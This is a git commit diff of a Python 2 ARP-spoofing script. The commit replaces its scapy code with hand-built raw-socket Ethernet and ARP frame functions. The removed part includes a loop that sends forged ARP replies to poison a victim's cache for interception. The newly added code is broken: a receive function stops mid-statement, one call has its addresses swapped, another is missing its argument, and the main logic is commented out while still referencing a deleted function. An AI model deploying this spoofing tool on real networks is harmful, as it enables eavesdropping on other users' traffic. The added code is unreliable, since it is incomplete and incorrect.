6a4ffdaeeb3635efb437b8eada6883bf83df7c1f
KimTaeuk <kimtae@stitch-mac.local>
2017-08-06 17:42:00 +0900

    Remove scapy, Add custom packet sending func.

--- arp_spoof.py
+++ arp_spoof.py
@@ -4,14 +4,70 @@
 import subprocess
 import sys
 import re
+import struct
 from threading import *
 from time import sleep
-from scapy.all import *
 from pwn import hexdump
+from socket import *
 
 execmd = lambda cmd : subprocess.check_output(cmd, shell=True)
+trans_ip = lambda addr : ''.join(map(lambda x:chr(eval(x)), addr.split('.')))
+trans_mac = lambda mac : ''.join(map(lambda x:x.decode('hex'), mac.split(':')))
+
+p16 = lambda x : struct.pack('>H', x)
+p32 = lambda x : struct.pack('>I', x)
+
 ip_regex = ('[\d]{1,3}.'*4)[:-1]
 mac_regex = ('[0-9a-f]{2}:'*6)[:-1]
+
+'''
+Send packet
+'''
+def sendeth(dst, src, type, payload):
+    pkt = trans_mac(dst)
+    pkt += trans_mac(src)
+    pkt += p16(type)
+    pkt += payload
+
+    s = socket(AF_PACKET, SOCK_RAW)
+    s.bind((sys.argv[1], 0))
+    print hexdump(pkt)
+    s.send(pkt)
+    
+'''
+Make arp packet
+'''
+def make_arp(hwtype, ptype, hwlen, plen, oper, snd_mac, snd_ip, tar_mac, tar_ip):
+    pkt = ''
+    pkt += p16(hwtype)
+    pkt += p16(ptype)
+    pkt += chr(hwlen)
+    pkt += chr(plen)
+    if oper == 'req':
+        pkt += p16(0x1)
+    elif oper == 'reply':
+        pkt += p16(0x2)
+    pkt += trans_mac(snd_mac)
+    pkt += trans_ip(snd_ip)
+    pkt += trans_mac(tar_mac)
+    pkt += trans_ip(tar_ip)
+    return pkt
+
+'''
+Receive packet
+'''
+def recv_pkt(proto_type):
+    s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+    while True:
+        tmp = s.recvfrom(65535)
+        eth_dstmac = tmp[:6]
+        eth_srcmac = tmp[6:12]
+        eth_type = tmp[12:14]
+        if eth_type == ARP:
+            arp_pkt = eth_
+
+        elif eth_type == IP:
+
 
 '''
 Get my mac,ip address 
@@ -26,37 +82,15 @@ def getMyAddr(dev):
 Get mac address using ip address.
 '''
 def get_macaddr(ip_addr):
-    eth_srcmac = my_mac
     eth_dstmac = 'ff:ff:ff:ff:ff:ff'
-    arp_srcip = ip_addr
-    arp_srcmac = '00:00:00:00:00:00'
-    arp_dstip = my_ip
-    arp_dstmac = my_mac       
-    reqPacket = Ether(src=eth_srcmac, dst=eth_dstmac, type=0x0806)/ARP(pdst=arp_srcip, psrc=arp_dstip, hwsrc=arp_dstmac, ptype=0x0800, hwtype=1, hwlen=6, plen=4, op=ARP.who_has)
-    return srp(reqPacket)
-
-'''
-Send arp reply packet to sender.
-'''
-def ARP_reply(sender_mac, sender_ip, target_ip):
-    while True:
-        try:
-            eth_srcmac = my_mac
-            eth_dstmac = sender_mac
-            arp_srcip = sender_ip
-            arp_srcmac = sender_mac
-            arp_dstip = target_ip
-            arp_dstmac = my_mac
-
-            print eth_srcmac, eth_dstmac, arp_srcip, arp_srcmac, arp_dstip, arp_dstmac
-
-            packet = Ether(src=eth_srcmac, dst=eth_dstmac, type=0x0806)/ARP(pdst=arp_srcip, hwdst=arp_srcmac, psrc=arp_dstip, hwsrc=arp_dstmac, ptype=0x0800, hwtype=1, hwlen=6, plen=4, op=ARP.is_at)
-
-            print '[+] ARP reply packet send to {}'.format(sender_ip)
-            sendp(packet, verbose=False)
-            sleep(3)
-        except:
-            break
+    eth_srcmac = my_mac
+    arp_sndmac = my_mac       
+    arp_sndip = my_ip
+    arp_tarmac = '00:00:00:00:00:00'
+    arp_tarip = ip_addr
+    pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'req', arp_sndmac, arp_sndip, arp_tarmac, arp_tarip)
+    sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)
+    recv_pkt()
 
 
 if __name__ == '__main__':
@@ -80,6 +114,8 @@ if __name__ == '__main__':
         target_ip.append(sys.argv[2*idx+1])
     my_mac, my_ip = getMyAddr(ifname)
 
+    get_macaddr(sender_ip[0])
+    '''
     print '[+] Get sender, target mac address.'
     for idx in range((len(sys.argv)-2)/2):
         sender_mac.append(get_macaddr(sender_ip[idx])[0][0][1].src)
@@ -97,7 +133,9 @@ if __name__ == '__main__':
     print '-'*34
     
     for idx in range((len(sys.argv)-2)/2):
-        Thread(target=ARP_reply, args=(sender_mac[idx], sender_ip[idx], target_ip[idx],)).start()
+        print '[*] TARGET{} THREAD START!'.format(idx+1)
+        Thread(target=ARP_reply, args=(idx,)).start() 
 
     while(1):
         sleep(5)
+    '''
